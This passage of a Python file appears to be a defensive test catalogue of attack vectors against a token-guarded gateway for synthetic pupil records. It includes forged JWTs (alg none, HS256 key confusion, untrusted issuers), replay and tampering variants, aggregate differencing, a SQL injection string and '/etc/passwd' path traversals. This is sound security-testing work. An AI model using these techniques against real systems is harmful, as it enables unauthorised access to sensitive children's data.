        "kind": "attack",
        "title": "draft a letter naming the flag pupil",
        "mandate": {"base": "default"},
        "tool": "draft",
        "arguments": {"urn": FLAG["urn"], "pupil_ids": [FLAG["pupil"]]},
        "note": "draft is out of scope and a step-up tool; it must not forward.",
    },
    # --- escalated mandates (own-mode): show what defences catch and what a broad mandate leaks ---
    {
        "id": "own-pupil-norole",
        "group": "data",
        "kind": "attack",
        "needs_mint": True,
        "title": "pupil at SCH04, clearance 4, no role",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [FLAG["urn"]]}}],
                "clearance": 4,
            }
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "Level 4 without a listed role must be held with ROLE_REQUIRED.",
    },
    {
        "id": "own-pupil-low",
        "group": "data",
        "kind": "attack",
        "needs_mint": True,
        "title": "pupil at SCH04, clearance 2",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [FLAG["urn"]]}}],
                "clearance": 2,
                "role": ROLE,
            }
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "Ethnicity/InCare are level 4; clearance 2 must be held with CLEARANCE_TOO_LOW.",
    },
    {
        "id": "own-pupil-full",
        "group": "data",
        "kind": "info",
        "needs_mint": True,
        "title": "pupil at SCH04, clearance 4 + role",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [FLAG["urn"]]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "With the right mandate the full level-4 record is returned by design; shows the data is reachable.",
    },
    {
        "id": "own-named-full",
        "group": "data",
        "kind": "info",
        "needs_mint": True,
        "title": "named in-care pupil, clearance 4 + role",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [NAMED["urn"]]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "pupil",
        "arguments": {"pupil_id": NAMED["pupil"], "urn": NAMED["urn"]},
        "note": "The level-4 named flag (Mason Owusu), reachable with a correct mandate.",
    },
    # --- aggregate quasi-identifier and differencing (own-mode counts mandate) ---
    {
        "id": "agg-by-pupil",
        "group": "aggregate",
        "kind": "attack",
        "needs_mint": True,
        "title": "aggregate grouped by pupil id",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "aggregate",
        "arguments": {"table": CENSUS, "group_by": ["Psuedo ID"], "measure": "FSMeligible"},
        "note": "Grouping by an identifier makes each group one pupil; TOO_FINE holds it.",
    },
    {
        "id": "agg-where-pupil",
        "group": "aggregate",
        "kind": "attack",
        "needs_mint": True,
        "title": "aggregate filtered to one pupil",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "aggregate",
        "arguments": {
            "table": CENSUS,
            "group_by": ["URN"],
            "measure": "FSMeligible",
            "where": {"Psuedo ID": FLAG["pupil"]},
        },
        "note": "A where on an identifier also singles out one pupil; TOO_FINE holds it.",
    },
    {
        "id": "agg-measure-l4-low",
        "group": "aggregate",
        "kind": "attack",
        "needs_mint": True,
        "title": "care count at clearance 3",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
                "clearance": 3,
            }
        },
        "tool": "aggregate",
        "arguments": {"table": CENSUS, "group_by": ["URN"], "measure": "InCareAtCurrentSchool"},
        "note": "The measure column is level 4; clearance 3 must be held with CLEARANCE_TOO_LOW.",
    },
    {
        "id": "agg-group-of-one",
        "group": "aggregate",
        "kind": "info",
        "needs_mint": True,
        "title": "in-care count at SCH07 (group of one)",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "aggregate",
        "arguments": {
            "table": CENSUS,
            "group_by": [],
            "measure": "InCareAtCurrentSchool",
            "where": {"URN": NAMED["urn"]},
        },
        "note": "SCH07 has one in-care pupil; rounding to the nearest 10 should blur the count of one.",
    },
    {
        "id": "agg-brookmere-meals",
        "group": "aggregate",
        "kind": "info",
        "needs_mint": True,
        "title": "Brookmere free-meal count",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "aggregate",
        "arguments": {"table": CENSUS, "group_by": ["URN"], "measure": "FSMeligible", "where": {"URN": "SCH02"}},
        "note": "74 meal rows. Pair with the WHIT count: both should round to 70 so the difference leaks nothing.",
    },
    {
        "id": "agg-brookmere-meals-whit",
        "group": "aggregate",
        "kind": "info",
        "needs_mint": True,
        "title": "Brookmere free-meal count, WHIT",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "aggregate",
        "arguments": {
            "table": CENSUS,
            "group_by": ["URN"],
            "measure": "FSMeligible",
            "where": {"URN": "SCH02", "Ethnicity": "WHIT"},
        },
        "note": "69 of the 74. If rounding leaves 74 and 69, the difference (5) identifies the non-WHIT pupils.",
    },
    # --- forged mandates ---
    {
        "id": "forged-edit-clearance",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "title": "raise the clearance, keep the signature",
        "mandate": {"base": "default", "forge": {"op": "keep-sig", "set": {"clearance": 5}}},
        "tool": "search",
        "arguments": {"query": FLAG["pupil"], "urn": "SCH01"},
        "note": "Editing any claim breaks the issuer signature; SIG_INVALID must hold it.",
    },
    {
        "id": "forged-widen-scope",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "title": "widen the scope to SCH04 pupil",
        "mandate": {
            "base": "default",
            "forge": {
                "op": "keep-sig",
                "set": {
                    "scope": [{"server": SERVER, "tools": ["pupil", "search"], "constraints": {"urn": [FLAG["urn"]]}}]
                },
            },
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "A widened scope with the old signature must be SIG_INVALID.",
    },
    {
        "id": "forged-untrusted-issuer",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "title": "re-sign under an untrusted issuer",
        "mandate": {
            "base": "default",
            "forge": {
                "op": "random-issuer",
                "set": {
                    "iss": "https://untrusted.invalid",
                    "scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [FLAG["urn"]]}}],
                },
            },
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "An issuer not on the trusted list must be ISSUER_NOT_ACCREDITED.",
    },
    {
        "id": "forged-alg-none",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "title": "unsigned token (alg none)",
        "mandate": {
            "base": "default",
            "forge": {
                "op": "none",
                "set": {"scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [FLAG["urn"]]}}]},
            },
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "alg none is not EdDSA; the gateway must refuse it (SIG_INVALID).",
    },
    {
        "id": "forged-hs256",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "needs_mint": True,
        "title": "alg confusion (HS256 with the public key)",
        "mandate": {
            "base": "default",
            "forge": {
                "op": "hs256",
                "set": {"scope": [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": [FLAG["urn"]]}}]},
            },
        },
        "tool": "pupil",
        "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
        "note": "Signing HS256 with the issuer public key must fail because the gateway pins EdDSA.",
    },
    {
        "id": "forged-typ",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "title": "wrong token type in the header",
        "mandate": {"base": "default", "forge": {"op": "keep-sig", "header": {"typ": "JWT"}}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "typ must be mandate+jwt; anything else is WRONG_TOKEN_TYPE.",
    },
    {
        "id": "forged-swap-cnf",
        "group": "forged",
        "kind": "attack",
        "break": "forged",
        "title": "rebind the mandate to our own key",
        "mandate": {"base": "default", "forge": {"op": "swap-cnf"}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "Swapping cnf to a key we hold breaks the signature; SIG_INVALID must hold it.",
    },
    {
        "id": "forged-demo-mint",
        "group": "forged",
        "kind": "attack",
        "type": "demo",
        "break": "forged",
        "title": "mint a mandate through the demo route",
        "demo_mandate": {"urn": FLAG["urn"], "tools": ["pupil", "search"], "clearance": 4},
        "demo_call": {"tool": "pupil", "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]}},
        "note": "The demo router mints mandates on request. If it is mounted, anyone can mint SCH04 access.",
    },
    # --- dead mandates ---
    {
        "id": "dead-expired",
        "group": "dead",
        "kind": "attack",
        "break": "dead",
        "needs_mint": True,
        "title": "an expired mandate",
        "mandate": {"mint": {**_DEFAULT_MINT, "ttl": -120}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "exp more than 30 s ago must be EXPIRED.",
    },
    {
        "id": "dead-revoked",
        "group": "dead",
        "kind": "attack",
        "break": "dead",
        "needs_mint": True,
        "title": "a revoked mandate",
        "mandate": {"mint": dict(_DEFAULT_MINT), "revoke": True},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "A set status bit must be REVOKED on the next call.",
    },
    {
        "id": "dead-nbf",
        "group": "dead",
        "kind": "attack",
        "break": "dead",
        "needs_mint": True,
        "title": "a not-yet-valid mandate",
        "mandate": {"base": "default", "forge": {"op": "issuer", "set": {"nbf": int(time.time()) + 4000}}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "nbf in the future (past the 30 s skew) must be NOT_YET_VALID.",
    },
    # --- no key / proof of possession ---
    {
        "id": "nokey-blank",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "blank signature",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"sig": "blank"},
        "note": "An unsigned request must be POP_FAILED.",
    },
    {
        "id": "nokey-garbage",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "garbage signature",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"sig": "garbage"},
        "note": "A random signature must be POP_FAILED.",
    },
    {
        "id": "nokey-wrong-key",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "signed by another key",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"sig": "wrong-key"},
        "note": "A signature from a key other than cnf must be POP_FAILED.",
    },
    {
        "id": "nokey-stale",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "stale timestamp",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"ts_offset": -SKEW},
        "note": "A timestamp outside the 300 s window must be POP_FAILED.",
    },
    {
        "id": "nokey-future",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "future timestamp",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"ts_offset": SKEW},
        "note": "A timestamp 10 minutes ahead must be POP_FAILED.",
    },
    {
        "id": "nokey-mutate",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "arguments changed after signing",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"mutate_after": {"limit": 1}},
        "note": "Changing arguments after signing must be POP_FAILED.",
    },
    {
        "id": "nokey-replay",
        "group": "nokey",
        "kind": "attack",
        "break": "nokey",
        "title": "replay the same request",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "tweaks": {"replay": True},
        "note": "A repeated nonce must be POP_FAILED on the replay.",
    },
    # --- bulk ---
    {
        "id": "bulk-limit-101",
        "group": "bulk",
        "kind": "attack",
        "title": "ask for 101 rows",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "2021/22", "urn": "SCH01", "limit": 101},
        "note": "limit over 100 must be TOO_MUCH.",
    },
    {
        "id": "bulk-limit-100",
        "group": "bulk",
        "kind": "info",
        "title": "ask for 100 rows",
        "mandate": {"base": "default"},
        "tool": "search",
        "arguments": {"query": "2021/22", "urn": "SCH01", "limit": 100},
        "note": "The cap is per call; 100 rows is allowed, so many calls still add up.",
    },
    {
        "id": "bulk-get-census",
        "group": "bulk",
        "kind": "attack",
        "break": "bulk",
        "needs_mint": True,
        "title": "bulk-export the census in one get",
        "mandate": {
            "mint": {
                "scope": [{"server": SERVER, "tools": ["get"], "constraints": {"path": [CENSUS_CSV]}}],
                "clearance": 4,
                "role": ROLE,
            }
        },
        "tool": "get",
        "arguments": {"path": CENSUS_CSV, "limit": 5000},
        "note": "A get mandate on the census with no row cap leaks every pupil at once (bulk).",
    },
    # --- crash ---
    {
        "id": "crash-empty",
        "group": "crash",
        "kind": "attack",
        "break": "crash",
        "title": "empty mandate string",
        "mandate": {"raw": ""},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "A malformed mandate must be a 403 denial, not a 500.",
    },
    {
        "id": "crash-not-jwt",
        "group": "crash",
        "kind": "attack",
        "break": "crash",
        "title": "non-JWT mandate",
        "mandate": {"raw": "not-a-jwt"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "A non-JWT mandate must be a 403 denial, not a 500.",
    },
    {
        "id": "crash-abc",
        "group": "crash",
        "kind": "attack",
        "break": "crash",
        "title": "three empty JWT segments",
        "mandate": {"raw": "a.b.c"},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "A junk three-part token must be a 403 denial, not a 500.",
    },
    {
        "id": "crash-no-iss",
        "group": "crash",
        "kind": "attack",
        "break": "crash",
        "needs_mint": True,
        "title": "valid signature, no issuer claim",
        "mandate": {"base": "default", "forge": {"op": "issuer", "del": ["iss"]}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "The verifier reads iss before catching errors; a missing iss must not 500.",
    },
    {
        "id": "crash-no-status",
        "group": "crash",
        "kind": "attack",
        "break": "crash",
        "needs_mint": True,
        "title": "valid signature, no status claim",
        "mandate": {"base": "default", "forge": {"op": "issuer", "del": ["status"]}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "A missing status claim must be a denial, not a 500.",
    },
    {
        "id": "crash-no-cnf",
        "group": "crash",
        "kind": "attack",
        "break": "crash",
        "needs_mint": True,
        "title": "valid signature, no cnf claim",
        "mandate": {"base": "default", "forge": {"op": "issuer", "del": ["cnf"]}},
        "tool": "search",
        "arguments": {"query": "P0004", "urn": "SCH01"},
        "note": "A missing cnf (proof-of-possession key) must be a denial, not a 500.",
    },
    # --- keys / discovery ---
    {
        "id": "keys-describe",
        "group": "keys",
        "kind": "attack",
        "type": "discovery",
        "break": "keys",
        "path": "/describe",
        "title": "scan /describe for the issuer key",
        "note": "Discovery must never carry the issuer private key.",
    },
    {
        "id": "keys-demo-issuer",
        "group": "keys",
        "kind": "attack",
        "type": "discovery",
        "break": "keys",
        "path": "/demo/issuer",
        "title": "scan /demo/issuer for the issuer key",
        "note": "The issuer page must show only the public half.",
    },
    {
        "id": "keys-demo-trust",
        "group": "keys",
        "kind": "attack",
        "type": "discovery",
        "break": "keys",
        "path": "/demo/trust",
        "title": "scan /demo/trust for the issuer key",
        "note": "The trust view must not expose any private key.",
    },
]


# ---------------------------------------------------------------- generated catalogue
#
# The hand-written vectors above are the curated tour. The generators below fan the same levers across every
# school, tool, clearance, claim and malformation, so "run every vector" is a systematic sweep of more than a
# thousand requests, not a sample. Each generated vector still carries the note that says why a sound gateway
# holds it, so every finding explains itself. Request-level variants reuse the cached base mandate; only the
# clearance, aggregate and cross-school mint grids mint, and the per-run cache keeps that to about a hundred.

GEN_SCHOOLS = [f"SCH{n:02d}" for n in range(1, 13)]
CENSUS_COLS = {
    "Psuedo ID": 2,
    "Gender": 2,
    "Ethnicity": 4,
    "Language": 3,
    "FSMeligible": 3,
    "InCareAtCurrentSchool": 4,
    "AcademicYear": 1,
    "CensusTerm": 1,
    "EnrolStatus": 2,
    "AgeAtStartOfAcademicYear": 2,
    "URN": 1,
}
IDENT_COLS = ("Psuedo ID", "DisplayName")
TOOL_LEVEL = {"search": 4, "pupil": 4, "roster": 2}  # the top sensitivity each tool can return

_N_SCOPE = "The default mandate is search at SCH01 only; another tool or school is held (OUT_OF_SCOPE/CONSTRAINT)."
_N_POP = "Proof of possession is checked before scope; a bad signature, timestamp or replayed nonce is POP_FAILED."
_N_FORGE = "Any edit to a signed mandate must fail the issuer signature or the accredited-issuer check."
_N_CRASH = "A malformed or incomplete mandate must be a 4xx denial, never an HTTP 500."
_N_BULK = "At most 100 rows per call; more, or a non-integer limit, must be TOO_MUCH."
_N_ROUND = "Aggregate counts leave rounded to the nearest 10, so a group smaller than 10 is not released as itself."


def _col_id(col: str) -> str:
    return "".join(ch.lower() if ch.isalnum() else "-" for ch in col).strip("-")


def _scope1(tool: str, urn: str) -> list[dict]:
    return [{"server": SERVER, "tools": [tool], "constraints": {"urn": [urn]}}]


def _counts_scope() -> list[dict]:
    return [{"server": SERVER, "tools": ["aggregate"], "constraints": {"table": [CENSUS]}}]


def _args_for(tool: str, urn: str) -> dict:
    table = {
        "search": {"query": "2021/22", "urn": urn},
        "pupil": {"pupil_id": FLAG["pupil"], "urn": urn},
        "roster": {"urn": urn, "year_group": 11},
        "draft": {"urn": urn, "pupil_ids": [FLAG["pupil"]]},
        "aggregate": {"table": CENSUS, "group_by": ["URN"], "measure": "FSMeligible", "where": {"URN": urn}},
        "write": {"urn": urn, "pupil_id": FLAG["pupil"], "column": "Gender", "before": "M", "after": "F"},
        "get": {"path": CENSUS_CSV},
    }
    return table[tool]


def _expect_allow(tool: str, clr: int, role: bool) -> bool:
    lvl = TOOL_LEVEL[tool]
    return clr >= lvl and (lvl < PRIVATE_LEVEL or role)


def _clearance_note(tool: str, clr: int, role: bool, allow: bool) -> str:
    lvl = TOOL_LEVEL[tool]
    if allow:
        return f"{tool} is level {lvl}; clearance {clr}{' + role' if role else ''} meets it — allowed by design."
    if clr < lvl:
        return f"{tool} is level {lvl}; clearance {clr} is below it — CLEARANCE_TOO_LOW."
    return f"{tool} is level {lvl}; clearance {clr} meets it but no listed role — ROLE_REQUIRED."


def _gen_scope() -> list[dict]:
    out = []
    for tool in ("search", "pupil", "roster", "draft", "aggregate", "write"):
        for urn in GEN_SCHOOLS:
            if tool == "search" and urn == "SCH01":
                continue  # the default mandate's own grant — the baseline covers it
            out.append(
                {
                    "id": f"g-scope-{tool}-{urn.lower()}",
                    "group": "scope",
                    "kind": "attack",
                    "title": f"{tool} at {urn} on the default mandate",
                    "mandate": {"base": "default"},
                    "tool": tool,
                    "arguments": _args_for(tool, urn),
                    "note": _N_SCOPE,
                }
            )
    return out


def _gen_clearance() -> list[dict]:
    out = []
    for tool in ("search", "pupil", "roster"):
        for urn in ("SCH01", FLAG["urn"], NAMED["urn"]):
            for clr in (1, 2, 3, 4):
                for role in (False, True):
                    allow = _expect_allow(tool, clr, role)
                    mint = {"scope": _scope1(tool, urn), "clearance": clr, "role": ROLE if role else None}
                    out.append(
                        {
                            "id": f"g-clr-{tool}-{urn.lower()}-c{clr}-{'role' if role else 'norole'}",
                            "group": "clearance",
                            "kind": "info" if allow else "attack",
                            "needs_mint": True,
                            "title": f"{tool} at {urn}, clearance {clr}{' + role' if role else ''}",
                            "mandate": {"mint": mint},
                            "tool": tool,
                            "arguments": _args_for(tool, urn),
                            "note": _clearance_note(tool, clr, role, allow),
                        }
                    )
    return out


def _gen_forge() -> list[dict]:
    wide = [{"server": SERVER, "tools": ["pupil", "search", "roster", "aggregate", "get"], "constraints": {}}]
    wide_urn = [{"server": SERVER, "tools": ["pupil"], "constraints": {"urn": GEN_SCHOOLS}}]
    tampers = (
        ("raise-clr", {"set": {"clearance": 9}}),
        ("widen", {"set": {"scope": wide}}),
        ("widen-urn", {"set": {"scope": wide_urn}}),
        ("drop-deny", {"del": ["deny"]}),
        ("set-role", {"set": {"clearance": 4, "role": ROLE}}),
        ("swap-iss", {"set": {"iss": "https://evil.invalid"}}),
        ("bump-exp", {"set": {"exp": int(time.time()) + 999999}}),
        ("purpose", {"set": {"purpose": "exfiltrate the flag pupil"}}),
    )
    ops = (("keep-sig", False), ("none", False), ("random-issuer", False), ("swap-cnf", False), ("hs256", True))
    out = []
    for opname, mint in ops:
        for tname, forge in tampers:
            out.append(
                {
                    "id": f"g-forge-{opname}-{tname}",
                    "group": "forged",
                    "kind": "attack",
                    "break": "forged",
                    "needs_mint": mint,
                    "title": f"forge {opname}: {tname}",
                    "mandate": {"base": "default", "forge": {"op": opname, **forge}},
                    "tool": "pupil",
                    "arguments": {"pupil_id": FLAG["pupil"], "urn": FLAG["urn"]},
                    "note": _N_FORGE,
                }
            )
    return out


def _gen_pop() -> list[dict]:
    tweaks = (
        ("blank", {"sig": "blank"}),
        ("garbage", {"sig": "garbage"}),
        ("wrong-key", {"sig": "wrong-key"}),
        ("stale", {"ts_offset": -SKEW}),
        ("stale-near", {"ts_offset": -350}),
        ("future", {"ts_offset": SKEW}),
        ("future-near", {"ts_offset": 350}),
        ("ts-zero", {"ts_offset": -int(time.time())}),
        ("mutate-limit", {"mutate_after": {"limit": 500}}),
        ("mutate-query", {"mutate_after": {"query": "SPR"}}),
        ("replay", {"replay": True}),
    )
    out = []
    for tool in ("search", "pupil", "get", "aggregate"):
        for urn in GEN_SCHOOLS:
            for tname, tw in tweaks:
                out.append(
                    {
                        "id": f"g-pop-{tool}-{urn.lower()}-{tname}",
                        "group": "nokey",
                        "kind": "attack",
                        "break": "nokey",
                        "title": f"{tool} at {urn}: {tname}",
                        "mandate": {"base": "default"},
                        "tool": tool,
                        "arguments": _args_for(tool, urn),
                        "tweaks": tw,
                        "note": _N_POP,
                    }
                )
    return out


def _lim_ok(lim: object) -> bool:
    return type(lim) is int and 0 <= lim <= BULK_THRESHOLD


def _gen_bulk() -> list[dict]:
    limits = (-1000, -1, 0, 1, 2, 50, 99, 100, 101, 250, 1000, 99999, "100", 1.5)
    out = []
    for i, lim in enumerate(limits):
        out.append(
            {
                "id": f"g-bulk-default-{i:02d}",
                "group": "bulk",
                "kind": "info" if _lim_ok(lim) else "attack",
                "title": f"search SCH01, limit {lim!r}",
                "mandate": {"base": "default"},
                "tool": "search",
                "arguments": {"query": "2021/22", "urn": "SCH01", "limit": lim},
                "note": _N_BULK,
            }
        )
    for urn in ("SCH02", FLAG["urn"], NAMED["urn"]):
        mint = {"scope": _scope1("search", urn), "clearance": 4, "role": ROLE}
        for lim in (100, 101, 1000):
            out.append(
                {
                    "id": f"g-bulk-{urn.lower()}-{lim}",
                    "group": "bulk",
                    "kind": "info" if _lim_ok(lim) else "attack",
                    "needs_mint": True,
                    "title": f"search {urn}, limit {lim}",
                    "mandate": {"mint": mint},
                    "tool": "search",
                    "arguments": {"query": "2021/22", "urn": urn, "limit": lim},
                    "note": _N_BULK,
                }
            )
    return out


def _gen_aggregate() -> list[dict]:
    out = []
    group_cols = [c for c in CENSUS_COLS if c not in IDENT_COLS]
    for col in group_cols:
        for urn in GEN_SCHOOLS:
            out.append(
                {
                    "id": f"g-agg-grp-{_col_id(col)}-{urn.lower()}",
                    "group": "aggregate",
                    "kind": "info",
                    "needs_mint": True,
                    "title": f"count by {col} at {urn}",
                    "mandate": {"mint": {"scope": _counts_scope(), "clearance": 4, "role": ROLE}},
                    "tool": "aggregate",
                    "arguments": {"table": CENSUS, "group_by": [col], "measure": "FSMeligible", "where": {"URN": urn}},
                    "note": _N_ROUND,
                }
            )
    for col in IDENT_COLS:
        out.append(
            {
                "id": f"g-agg-byid-{_col_id(col)}",
                "group": "aggregate",
                "kind": "attack",
                "needs_mint": True,
                "title": f"aggregate grouped by {col}",
                "mandate": {"mint": {"scope": _counts_scope(), "clearance": 4, "role": ROLE}},
                "tool": "aggregate",
                "arguments": {"table": CENSUS, "group_by": [col], "measure": "FSMeligible"},
                "note": f"Grouping by {col} makes each group one pupil — TOO_FINE.",
            }
        )
    for col, lvl in CENSUS_COLS.items():
        for clr in (2, 3, 4):
            allow = clr >= lvl
            mint = {"scope": _counts_scope(), "clearance": clr, "role": ROLE}
            out.append(
                {
                    "id": f"g-agg-measure-{_col_id(col)}-c{clr}",
                    "group": "aggregate",
                    "kind": "info" if allow else "attack",
                    "needs_mint": True,
                    "title": f"count of {col} at clearance {clr}",
                    "mandate": {"mint": mint},
                    "tool": "aggregate",
                    "arguments": {"table": CENSUS, "group_by": ["URN"], "measure": col},
                    "note": f"{col} is level {lvl}; a count of it needs that clearance or it is CLEARANCE_TOO_LOW.",
                }
            )
    return out


def _gen_crash() -> list[dict]:
    raws = [
        "",
        "not-a-jwt",
        "a.b.c",
        "a.b",
        "...",
        "a..c",
        "{}",
        "null",
        "ey.ey.ey",
        "x" * 4000,
        "ma\u00f1ana.b.c",
        "eyJ0eXAiOiJtYW5kYXRlK2p3dCJ9",
    ]
    # nbf is omitted on purpose: it is optional (defaults to 0), so deleting it is legitimate, not a crash.
    dels = ("iss", "status", "cnf", "scope", "deny", "agent_id", "exp", "jti", "clearance")
    bad = (("clearance", "four"), ("scope", "all"), ("status", 123), ("cnf", "x"), ("exp", "soon"), ("nbf", "later"))
    base_args = {"query": "P0004", "urn": "SCH01"}
    out = []
    for i, raw in enumerate(raws):
        out.append(
            {
                "id": f"g-crash-raw-{i:02d}",
                "group": "crash",
                "kind": "attack",
                "break": "crash",
                "title": f"malformed token #{i:02d}",
                "mandate": {"raw": raw},
                "tool": "search",
                "arguments": base_args,
                "note": _N_CRASH,
            }
        )
    for claim in dels:
        out.append(
            {
                "id": f"g-crash-del-{claim}",
                "group": "crash",
                "kind": "attack",
                "break": "crash",
                "needs_mint": True,
                "title": f"valid signature, no {claim}",
                "mandate": {"base": "default", "forge": {"op": "issuer", "del": [claim]}},
                "tool": "search",
                "arguments": base_args,
                "note": _N_CRASH,
            }
        )
    for claim, val in bad:
        out.append(
            {
                "id": f"g-crash-bad-{claim}",
                "group": "crash",
                "kind": "attack",
                "break": "crash",
                "needs_mint": True,
                "title": f"valid signature, {claim}={val!r}",
                "mandate": {"base": "default", "forge": {"op": "issuer", "set": {claim: val}}},
                "tool": "search",
                "arguments": base_args,
                "note": _N_CRASH,
            }
        )
    return out


def _gen_query() -> list[dict]:
    queries = ["", " ", "\t", "x" * 3000, "'; DROP TABLE census;--", "%", "*", "../", "\u0000", "P0004", "SPR", "Y11"]
    out = []
    for i, q in enumerate(queries):
        out.append(
            {
                "id": f"g-query-{i:02d}",
                "group": "query",
                "kind": "attack" if not str(q).strip() else "info",
                "title": f"search SCH01, query {q[:16]!r}",
                "mandate": {"base": "default"},
                "tool": "search",
                "arguments": {"query": q, "urn": "SCH01"},
                "note": "An empty or whitespace query matches every row (TOO_MUCH); a real query stays in scope.",
            }
        )
    return out


def _gen_path() -> list[dict]:
    paths = [
        CENSUS_CSV,
        NAMES_CSV,
        DEPRIVATION_CSV,
        "synthetic/../synthetic/synthetic_personal_data_school_census.csv",
        "synthetic//synthetic_personal_data_school_census.csv",
        "/etc/passwd",
        "../../../etc/passwd",
        "synthetic/synthetic_schools.csv/../synthetic_personal_data_school_census.csv",
    ]
    out = []
    for i, path in enumerate(paths):
        out.append(
            {
                "id": f"g-path-default-{i:02d}",
                "group": "path",
                "kind": "attack",
                "title": f"get {path} on the default mandate",
                "mandate": {"base": "default"},
                "tool": "get",
                "arguments": {"path": path},
                "note": "get is not in the default scope, and no traversal resolves back into it — held.",
            }
        )
    mint = {
        "scope": [{"server": SERVER, "tools": ["get"], "constraints": {"path": [SCHOOLS]}}],
        "clearance": 4,
        "role": ROLE,
    }
    for i, path in enumerate(paths):
        out.append(
            {
                "id": f"g-path-schools-{i:02d}",
                "group": "path",
                "kind": "info" if path == SCHOOLS else "attack",
                "needs_mint": True,
                "title": f"get {path} on a schools-file mandate",
                "mandate": {"mint": mint},
                "tool": "get",
                "arguments": {"path": path},
                "note": "The mandate is the schools file only; any other path or traversal is CONSTRAINT_VIOLATED.",
            }
        )
    return out


def _gen_keys() -> list[dict]:
    routes = ["/describe", "/demo/issuer", "/demo/trust", "/healthcheck", "/demo/mandate", "/openapi.json", "/docs"]
    return [
        {
            "id": f"g-keys-{_col_id(path)}",
            "group": "keys",
            "kind": "attack",
            "type": "discovery",
            "break": "keys",
            "path": path,
            "title": f"scan {path} for the issuer key",
            "note": "No endpoint may return the issuer private key.",
        }
        for path in routes
    ]


_GENERATORS = (
    _gen_scope,
    _gen_clearance,
    _gen_forge,
    _gen_pop,
    _gen_bulk,
    _gen_aggregate,
    _gen_crash,
    _gen_query,
    _gen_path,
    _gen_keys,
)


def generated() -> list[dict]:
    out: list[dict] = []
    for gen in _GENERATORS:
        out.extend(gen())
    return out


